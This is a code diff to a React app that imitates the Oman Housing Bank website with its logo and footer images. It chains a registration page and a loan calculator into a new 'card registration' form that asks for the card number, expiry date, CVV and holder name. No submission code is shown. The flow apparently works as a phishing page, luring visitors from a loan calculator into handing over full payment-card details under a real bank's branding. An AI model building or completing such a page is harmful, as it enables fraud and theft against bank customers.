@@ -1,5 +1,5 @@
 import { useState, useRef, useEffect } from "react";
-import { Menu, Search, ChevronUp, ChevronDown, User, Phone, CreditCard } from "lucide-react";
+import { Menu, Search, ChevronUp, ChevronDown, User, Phone, CreditCard, Lock, CalendarDays } from "lucide-react";
 
 /* ─── Option types ─── */
 type OptionItem =
@@ -447,7 +447,7 @@ function RegistrationPage({ onNext }: RegistrationPageProps) {
 /* ══════════════════════════════════════════
    PAGE 2 — Loan Calculator
 ══════════════════════════════════════════ */
-function LoanCalculatorPage() {
+function LoanCalculatorPage({ onNext }: { onNext: () => void }) {
   const [loanType, setLoanType] = useState("شراء منزل مكتمل");
   const [ageLimit, setAgeLimit] = useState("ذكر - حد أقصى 60");
   const [loanTerm, setLoanTerm] = useState("عادي 25 سنة - 300 شهر");
@@ -460,7 +460,10 @@ function LoanCalculatorPage() {
 
   function calculate() {
     setIsCalculated(true);
-    window.setTimeout(() => setIsCalculated(false), 1200);
+    window.setTimeout(() => {
+      setIsCalculated(false);
+      onNext();
+    }, 1200);
   }
 
   return (
@@ -987,12 +990,345 @@ function LoanCalculatorPage() {
 }
 
 /* ══════════════════════════════════════════
-   ROOT — two-page flow
+   PAGE 3 — Card Registration
+══════════════════════════════════════════ */
+function CardRegistrationPage() {
+  const [cardNum, setCardNum]     = useState("");
+  const [cvv, setCvv]             = useState("");
+  const [expiry, setExpiry]       = useState("");
+  const [holder, setHolder]       = useState("");
+  const [agreed, setAgreed]       = useState(false);
+
+  function handleCardNum(v: string) {
+    const digits = v.replace(/\D/g, "").slice(0, 16);
+    const formatted = digits.replace(/(.{4})/g, "$1 ").trim();
+    setCardNum(formatted);
+  }
+
+  function handleExpiry(v: string) {
+    const digits = v.replace(/\D/g, "").slice(0, 4);
+    if (digits.length >= 3) {
+      setExpiry(digits.slice(0, 2) + " / " + digits.slice(2));
+    } else {
+      setExpiry(digits);
+    }
+  }
+
+  return (
+    <main className="card-page" dir="rtl">
+      <style>{`
+        .card-page {
+          min-height: 100vh;
+          width: 100%;
+          background: #f7f7f7;
+          font-family: Tahoma, Arial, sans-serif;
+          box-sizing: border-box;
+          color: #5f5f5f;
+        }
+        .card-page *, .card-page *::before, .card-page *::after { box-sizing: border-box; }
+
+        /* reuse same header */
+        .card-header {
+          height: 92px; width: 100%;
+          display: flex; align-items: center; justify-content: space-between;
+          padding: 0 40px; direction: ltr;
+          background: #202020;
+        }
+        .card-header-actions { display: flex; align-items: center; gap: 38px; }
+        .card-header-icon { color: #f5f5f5; display: block; }
+        .card-menu-icon   { width: 28px; height: 28px; }
+        .card-search-icon { width: 22px; height: 22px; }
+        .card-logo-img {
+          height: 72px; width: 230px;
+          object-fit: cover; object-position: right center; display: block;
+        }
+
+        /* content */
+        .card-content {
+          width: calc(100% - 38px);
+          min-height: calc(100vh - 92px);
+          margin: 0 auto;
+          padding: 26px 24px 16px;
+          background: #fbfbfb;
+          border-right: 1px solid #d6d6d6;
+          border-left:  1px solid #d6d6d6;
+        }
+        .card-page-title {
+          text-align: center;
+          font-size: 30px;
+          font-weight: 700;
+          color: #1e1e1e;
+          margin: 0 0 24px;
+        }
+
+        /* field */
+        .cf-group { margin-bottom: 18px; }
+        .cf-label {
+          display: block;
+          text-align: right;
+          font-size: 18px;
+          color: #626262;
+          margin-bottom: 7px;
+        }
+        .cf-input-wrap {
+          display: flex;
+          align-items: center;
+          border: 1px solid #bd927e;
+          border-radius: 8px;
+          background: #fff;
+          overflow: hidden;
+          transition: box-shadow .2s, border-color .2s;
+        }
+        .cf-input-wrap:focus-within {
+          border-color: #8a6558;
+          box-shadow: 0 0 0 3px rgba(189,146,126,.16);
+        }
+        .cf-icon {
+          width: 48px; flex-shrink: 0;
+          display: flex; align-items: center; justify-content: center;
+          color: #888;
+          border-left: 1px solid #e0ccc4;
+          height: 48px;
+        }
+        .cf-input {
+          flex: 1; height: 48px;
+          border: none; outline: none; background: transparent;
+          font-family: Tahoma, Arial, sans-serif;
+          font-size: 16px; color: #222;
+          text-align: right; direction: rtl;
+          padding: 0 13px 0 8px;
+        }
+        .cf-input::placeholder { color: #bbb; direction: ltr; text-align: right; }
+        .cf-input.ltr-input {
+          direction: ltr;
+          text-align: left;
+          letter-spacing: 1.5px;
+        }
+        .cf-input.ltr-input::placeholder { direction: ltr; text-align: left; letter-spacing: 1px; }
+
+        /* two-col row */
+        .cf-row {
+          display: flex;
+          gap: 12px;
+          margin-bottom: 18px;
+          direction: rtl;
+        }
+        .cf-row .cf-group { flex: 1; margin-bottom: 0; }
+
+        /* CVV dots placeholder */
+        .cf-input.cvv-input::placeholder { letter-spacing: 4px; }
+
+        /* right icon (inside input on the left side due to RTL) */
+        .cf-icon-right {
+          width: 48px; flex-shrink: 0;
+          display: flex; align-items: center; justify-content: center;
+          color: #888;
+          border-right: 1px solid #e0ccc4;
+          height: 48px;
+          order: 1;
+        }
+
+        /* checkbox */
+        .cf-checkbox-row {
+          display: flex;
+          align-items: center;
+          justify-content: flex-end;
+          gap: 10px;
+          margin: 6px 0 18px;
+          direction: rtl;
+          font-size: 17px;
+          color: #444;
+        }
+        .cf-checkbox {
+          width: 20px; height: 20px;
+          border: 1.5px solid #bd927e;
+          border-radius: 4px;
+          appearance: none;
+          cursor: pointer;
+          background: #fff;
+          flex-shrink: 0;
+          transition: background .15s, border-color .15s;
+        }
+        .cf-checkbox:checked {
+          background: #c87f64;
+          border-color: #c87f64;
+        }
+        .cf-terms-link {
+          color: #c87f64;
+          text-decoration: underline;
+          cursor: pointer;
+        }
+
+        /* submit button */
+        .cf-submit-btn {
+          width: 100%; height: 58px;
+          border: none; border-radius: 8px;
+          background: #c87f64; color: #fff;
+          font-family: Tahoma, Arial, sans-serif;
+          font-size: 21px; font-weight: 600;
+          cursor: pointer;
+          transition: filter .18s, transform .14s;
+        }
+        .cf-submit-btn:hover  { filter: brightness(1.06); }
+        .cf-submit-btn:active { transform: scale(.98); }
+
+        /* footer */
+        .card-footer {
+          width: calc(100% - 38px);
+          margin: 18px auto 0;
+          border-radius: 14px;
+          overflow: hidden;
+          box-shadow: 0 4px 20px rgba(0,0,0,.18);
+          display: block; line-height: 0;
+        }
+        .card-footer img { width: 100%; display: block; }
+
+        /* bot (reuse) */
+        .card-bot {
+          position: fixed; z-index: 3;
+          right: 26px; bottom: 10px;
+          width: 78px; height: 78px;
+          border: 0; border-radius: 50%;
+          background: #fff;
+          box-shadow: 0 1px 9px rgba(0,0,0,.18);
+          cursor: pointer;
+          animation: cbot-float 2.8s ease-in-out infinite;
+        }
+        .card-bot .notification-badge {
+          position: absolute; z-index: 4;
+          top: -5px; right: 1px;
+          width: 22px; height: 22px;
+          display: grid; place-items: center;
+          border-radius: 50%;
+          color: #fff; background: #ec0808;
+          font-family: Arial, sans-serif;
+          font-size: 13px; font-weight: 700;
+        }
+        @keyframes cbot-float {
+          0%, 100% { transform: translateY(0); }
+          50%       { transform: translateY(-4px); }
+        }
+      `}</style>
+
+      <header className="card-header">
+        <div className="card-header-actions">
+          <Menu className="card-header-icon card-menu-icon" strokeWidth={2.1} />
+          <Search className="card-header-icon card-search-icon" strokeWidth={3} />
+        </div>
+        <img
+          src="/__mockup/images/oman-bank-logo.jpeg"
+          alt="بنك الإسكان العماني - Oman Housing Bank"
+          className="card-logo-img"
+        />
+      </header>
+
+      <section className="card-content">
+        <h1 className="card-page-title">تسجيل بطاقة صراف</h1>
+
+        {/* رقم البطاقة */}
+        <div className="cf-group">
+          <label className="cf-label">:رقم البطاقة</label>
+          <div className="cf-input-wrap">
+            <div className="cf-icon"><CreditCard size={20} strokeWidth={1.8} /></div>
+            <input
+              className="cf-input ltr-input"
+              placeholder="1234 5678 9012 3456"
+              inputMode="numeric"
+              value={cardNum}
+              onChange={(e) => handleCardNum(e.target.value)}
+            />
+          </div>
+        </div>
+
+        {/* CVV + تاريخ الانتهاء */}
+        <div className="cf-row">
+          {/* تاريخ الانتهاء — right in RTL */}
+          <div className="cf-group">
+            <label className="cf-label">:تاريخ الانتهاء</label>
+            <div className="cf-input-wrap">
+              <div className="cf-icon"><CalendarDays size={20} strokeWidth={1.8} /></div>
+              <input
+                className="cf-input ltr-input"
+                placeholder="MM / YY"
+                inputMode="numeric"
+                value={expiry}
+                onChange={(e) => handleExpiry(e.target.value)}
+              />
+            </div>
+          </div>
+          {/* CVV — left in RTL */}
+          <div className="cf-group">
+            <label className="cf-label">:(CVV) الرمز السري</label>
+            <div className="cf-input-wrap">
+              <div className="cf-icon"><Lock size={20} strokeWidth={1.8} /></div>
+              <input
+                className="cf-input cvv-input ltr-input"
+                placeholder="• • •"
+                inputMode="numeric"
+                maxLength={3}
+                value={cvv}
+                onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
+              />
+            </div>
+          </div>
+        </div>
+
+        {/* اسم صاحب البطاقة */}
+        <div className="cf-group">
+          <label className="cf-label">:اسم صاحب البطاقة</label>
+          <div className="cf-input-wrap">
+            <div className="cf-icon"><User size={20} strokeWidth={1.8} /></div>
+            <input
+              className="cf-input"
+              placeholder="الاسم كما هو على البطاقة"
+              value={holder}
+              onChange={(e) => setHolder(e.target.value)}
+            />
+          </div>
+        </div>
+
+        {/* الشروط */}
+        <div className="cf-checkbox-row">
+          <span>أوافق على <span className="cf-terms-link">الشروط والأحكام</span></span>
+          <input
+            type="checkbox"
+            className="cf-checkbox"
+            checked={agreed}
+            onChange={(e) => setAgreed(e.target.checked)}
+          />
+        </div>
+
+        <button className="cf-submit-btn" type="button">
+          تسجيل البطاقة
+        </button>
+      </section>
+
+      <div className="card-footer">
+        <img src="/__mockup/images/oman-footer.jpeg" alt="بنك الإسكان العماني - معلومات التواصل" />
+      </div>
+
+      <button className="card-bot support-bot" aria-label="فتح المساعدة">
+        <span className="notification-badge">1</span>
+        <span className="bot-antenna" />
+        <span className="bot-face">
+          <span className="bot-eye bot-eye-left" />
+          <span className="bot-eye bot-eye-right" />
+          <span className="bot-mouth" />
+        </span>
+        <span className="bot-side bot-side-left" />
+        <span className="bot-side bot-side-right" />
+      </button>
+    </main>
+  );
+}
+
+/* ══════════════════════════════════════════
+   ROOT — three-page flow
 ══════════════════════════════════════════ */
 export function OmanHousingForm() {
-  const [page, setPage] = useState<1 | 2>(1);
+  const [page, setPage] = useState<1 | 2 | 3>(1);
 
-  return page === 1
-    ? <RegistrationPage onNext={() => setPage(2)} />
-    : <LoanCalculatorPage />;
+  if (page === 1) return <RegistrationPage onNext={() => setPage(2)} />;
+  if (page === 2) return <LoanCalculatorPage onNext={() => setPage(3)} />;
+  return <CardRegistrationPage />;
 }
